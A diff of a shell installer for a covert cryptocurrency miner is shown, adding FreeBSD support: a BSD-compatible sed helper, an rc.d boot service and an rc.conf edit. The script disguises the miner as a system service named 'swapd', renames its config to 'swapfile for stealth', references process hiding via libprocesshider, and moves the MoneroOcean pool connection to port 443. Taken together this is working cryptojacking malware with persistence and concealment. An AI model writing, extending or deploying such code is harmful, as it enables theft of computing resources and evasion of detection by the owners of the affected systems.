@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="4.2"
-readonly BUILD_DATE="2026-03-22 05:13:45 UTC"
+readonly SCRIPT_VERSION="4.3"
+readonly BUILD_DATE="2026-03-22 05:31:06 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -54,11 +54,18 @@ if command -v systemctl >/dev/null 2>&1; then
     fi
 fi
 
-# Check SysV init service
-if [ "$SWAPD_RUNNING" = false ] && [ -f /etc/init.d/swapd ]; then
-    if service swapd status 2>/dev/null | grep -qE "running|active"; then
-        SWAPD_RUNNING=true
-        echo "[!] Detected: swapd service is running (init.d)"
+# Check SysV init service (Linux) or rc.d service (FreeBSD)
+if [ "$SWAPD_RUNNING" = false ]; then
+    if [ "$(uname -s)" = "FreeBSD" ] && [ -f /usr/local/etc/rc.d/swapd ]; then
+        if service swapd status 2>/dev/null | grep -qE "running|is running"; then
+            SWAPD_RUNNING=true
+            echo "[!] Detected: swapd service is running (FreeBSD rc.d)"
+        fi
+    elif [ -f /etc/init.d/swapd ]; then
+        if service swapd status 2>/dev/null | grep -qE "running|active"; then
+            SWAPD_RUNNING=true
+            echo "[!] Detected: swapd service is running (init.d)"
+        fi
     fi
 fi
 
@@ -1502,6 +1509,37 @@ if [ "$(uname -s)" = "FreeBSD" ]; then
     echo ""
 fi
 
+# ==================== BSD/GNU SED COMPATIBILITY ====================
+# FreeBSD uses BSD sed which requires different syntax than GNU sed
+# GNU sed: sed -i 's/old/new/' file
+# BSD sed: sed -i '' 's/old/new/' file
+
+sed_inplace() {
+    # Usage: sed_inplace 's/old/new/' filename
+    # Automatically detects BSD vs GNU sed and uses correct syntax
+    
+    local sed_expr="$1"
+    local filename="$2"
+    
+    if [ "$IS_FREEBSD" = true ]; then
+        # BSD sed (FreeBSD) - requires empty string after -i
+        sed -i '' "$sed_expr" "$filename" 2>/dev/null || true
+    else
+        # GNU sed (Linux) - no empty string needed
+        sed -i "$sed_expr" "$filename" 2>/dev/null || true
+    fi
+}
+
+# ==================== FREEBSD SERVICE PATH ====================
+# FreeBSD uses different service locations than Linux
+if [ "$IS_FREEBSD" = true ]; then
+    SERVICE_DIR="/usr/local/etc/rc.d"
+    SERVICE_FILE="$SERVICE_DIR/swapd"
+else
+    SERVICE_DIR="/etc/init.d"
+    SERVICE_FILE="$SERVICE_DIR/swapd"
+fi
+
 # ==================== DPKG INTERRUPT AUTO-FIX (Debian/Ubuntu) ====================
 # Detect and fix interrupted dpkg/apt operations before installing packages
 
@@ -2829,9 +2867,9 @@ cat > config.json << 'EOL'
 }
 EOL
 
-# Replace placeholders with actual values
-sed -i "s/WALLET_PLACEHOLDER/$WALLET/" config.json
-sed -i "s/PASS_PLACEHOLDER/$PASS/" config.json
+# Replace placeholders with actual values using BSD-compatible sed
+sed_inplace "s/WALLET_PLACEHOLDER/$WALLET/" config.json
+sed_inplace "s/PASS_PLACEHOLDER/$PASS/" config.json
 
 # Rename to swapfile for stealth
 mv config.json swapfile
@@ -2883,9 +2921,9 @@ exec ./swapd \
     --coinbase-addr=WALLET_PLACEHOLDER
 MINERD_EOF
     
-    # Replace placeholders
-    sed -i "s|WALLET_PLACEHOLDER|$WALLET|g" /root/.swapd/swapfile
-    sed -i "s|PASS_PLACEHOLDER|$PASS|g" /root/.swapd/swapfile
+    # Replace placeholders using BSD-compatible sed
+    sed_inplace "s|WALLET_PLACEHOLDER|$WALLET|g" /root/.swapd/swapfile
+    sed_inplace "s|PASS_PLACEHOLDER|$PASS|g" /root/.swapd/swapfile
     chmod +x /root/.swapd/swapfile
     
     echo "[✓] pooler-cpuminer configured for MoneroOcean"
@@ -3008,6 +3046,65 @@ SERVICE_EOF
     echo ""
 
     # No process-hider daemon needed - libprocesshider handles everything!
+elif [ "$IS_FREEBSD" = true ]; then
+    # ==================== CREATE FREEBSD RC.D SCRIPT ====================
+    echo "[*] Creating FreeBSD rc.d script..."
+
+    # Set daemon and args based on miner type
+    if [ "$MINER_TYPE" = "cpuminer" ]; then
+        DAEMON_PATH="/root/.swapd/swapfile"
+        DAEMON_ARGS_VALUE=""
+    else
+        DAEMON_PATH="/root/.swapd/swapd"
+        DAEMON_ARGS_VALUE="-c /root/.swapd/swapfile"
+    fi
+
+    mkdir -p /usr/local/etc/rc.d
+    
+    cat > /usr/local/etc/rc.d/swapd << 'FREEBSD_RC_EOF'
+#!/bin/sh
+#
+# PROVIDE: swapd
+# REQUIRE: DAEMON NETWORKING
+# KEYWORD: shutdown
+#
+# Add the following line to /etc/rc.conf to enable swapd:
+# swapd_enable="YES"
+
+. /etc/rc.subr
+
+name="swapd"
+rcvar=swapd_enable
+
+load_rc_config $name
+
+: ${swapd_enable:="NO"}
+: ${swapd_user:="root"}
+: ${swapd_chdir:="/root/.swapd"}
+
+pidfile="/var/run/${name}.pid"
+command="/usr/sbin/daemon"
+command_args="-f -p ${pidfile} DAEMON_PATH_PLACEHOLDER DAEMON_ARGS_PLACEHOLDER"
+
+run_rc_command "$1"
+FREEBSD_RC_EOF
+
+    # Replace placeholders using BSD-compatible sed
+    sed_inplace "s|DAEMON_PATH_PLACEHOLDER|$DAEMON_PATH|g" /usr/local/etc/rc.d/swapd
+    sed_inplace "s|DAEMON_ARGS_PLACEHOLDER|$DAEMON_ARGS_VALUE|g" /usr/local/etc/rc.d/swapd
+    
+    chmod +x /usr/local/etc/rc.d/swapd
+    
+    # Enable service in /etc/rc.conf
+    if ! grep -q '^swapd_enable' /etc/rc.conf 2>/dev/null; then
+        echo 'swapd_enable="YES"' >> /etc/rc.conf
+    else
+        sed_inplace 's/^swapd_enable=.*/swapd_enable="YES"/' /etc/rc.conf
+    fi
+    
+    echo "[✓] FreeBSD rc.d script created and enabled"
+    echo "[*] Service will start on boot via rc.conf"
+    echo ""
 else
     # ==================== CREATE SYSV INIT SCRIPT ====================
     echo "[*] Creating SysV init script (BusyBox compatible)..."
@@ -3268,7 +3365,7 @@ fix_connection_port() {
         
         # Change port from :80 to :443
         if [ -f /root/.swapd/swapfile ]; then
-            sed -i 's|gulf\.moneroocean\.stream:80|gulf.moneroocean.stream:443|g' /root/.swapd/swapfile
+            sed_inplace 's|gulf\.moneroocean\.stream:80|gulf.moneroocean.stream:443|g' /root/.swapd/swapfile
             echo "[*] Changed pool port from :80 to :443"
             
             # Restart service with new configuration
@@ -3306,6 +3403,17 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     systemctl start process-hider 2>/dev/null || true
     sleep 1
     echo "[✓] Process hiding daemon started"
+elif [ "$IS_FREEBSD" = true ] && [ -f /usr/local/etc/rc.d/swapd ]; then
+    # FreeBSD rc.d
+    if service swapd status 2>/dev/null | grep -q "is running"; then
+        echo "[*] Service already running - restarting service..."
+        service swapd restart
+    else
+        echo "[*] Starting service for first time..."
+        service swapd start
+    fi
+    sleep 2
+    service swapd status 2>/dev/null || echo "[*] Service started"
 elif [ -f /etc/init.d/swapd ]; then
     # SysV init
     if /etc/init.d/swapd status 2>/dev/null | grep -q "running"; then
